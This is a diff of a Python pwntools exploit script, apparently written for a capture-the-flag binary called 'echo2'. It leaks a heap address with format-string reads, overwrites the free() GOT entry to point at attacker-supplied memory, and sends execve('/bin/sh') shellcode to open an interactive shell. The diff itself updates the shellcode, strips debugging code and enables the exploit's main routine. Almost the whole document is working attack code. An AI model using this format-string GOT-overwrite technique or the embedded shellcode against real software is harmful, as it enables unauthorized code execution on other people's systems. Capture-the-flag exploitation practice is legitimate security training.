@@ -11,10 +11,9 @@ else:
 	conn = process('./echo2')
 
 nombre = 'physics'
-# https://www.exploit-db.com/exploits/42179
 shellcode = 'A' + 'B' * 29 + 'C'
-shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-#nombre = shellcode
+# http://shell-storm.org/shellcode/files/shellcode-806.php
+shellcode = "\x90" * 3 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 free_GOT = 0x602000
 obj_o = 0x602098
 
@@ -26,8 +25,6 @@ def read_addr(address, text=False):
 	payload  = '%7$s    '
 	payload += p64(address)
 	conn.sendline( payload )
-	#print conn.recvuntil('\n')
-	#print conn.recvuntil('\n')
 	addr = conn.recvuntil('    ')[:-4]
 	if text is False:
 		addr += '\x00' * (8 - len(addr))
@@ -41,29 +38,7 @@ def main():
 	conn.sendline(nombre)
 	conn.recvuntil('> ')
 
-	### get shellcode addr
-	##conn.sendline('2')
-	##conn.recvuntil('\n')
-	##conn.sendline('%10$p')
-	##line = conn.recvline()
-	##leak = int(line[2:], 16)
-	##print 'stack leak:' + hex(leak)
-	##shellcode_addr = leak - 32
-	##print 'shellcode addr:' + hex(shellcode_addr)
-	##print ''
-	##conn.recvuntil('> ')
-	#print read_addr(shellcode_addr, text=True)
-	#for i in range(0x100):
-	#	print str(i)
-	#	try:
-	#		print hex(leak-(i*8))
-	#		print read_addr(leak-(i*8), text=True)
-	#	except:
-	#		pass
-
-
-
-
+	# get shellcode address
 	leak = read_addr(obj_o)
 	print 'heap leak:' + hex(leak)
 	shellcode_addr = leak + 48
@@ -72,26 +47,6 @@ def main():
 		print 'Try again'
 		conn.close()
 		return
-	#conn.sendline('3')
-	#shellcode = 'A' + 'B' * 29 + 'C'
-	#conn.sendline(shellcode)
-	#conn.recvuntil('> ')
-	#for i in range(0x100):
-	#	print str(i)
-	#	try:
-	#		print hex(leak+(i*8))
-	#		print read_addr(leak+(i*8), text=True)
-	#	except:
-	#		pass
-	#return
-
-	# get shellcode addr
-	#if len(hex(shellcode_addr)) > 8:
-	#	print 'try again'
-	#	return
-	#print 'shellcode addr:' + hex(shellcode_addr)
-
-
 
 	# wipe free got adddr
 	conn.sendline('2')
@@ -129,15 +84,14 @@ def main():
 	print 'new free addr:' + hex(read_addr(free_GOT))
 	#print 'shellcode:' + read_addr(shellcode_addr, text=True)
 
-	# pwn
+	# write shellcode and execute its execution
 	conn.sendline('3')
 	conn.sendline(shellcode)
 	conn.interactive()
 	conn.close()
 
 if __name__ == '__main__':
-	main()
 	try:
-		pass#main()
+		main()
 	except KeyboardInterrupt as e:
 		pass
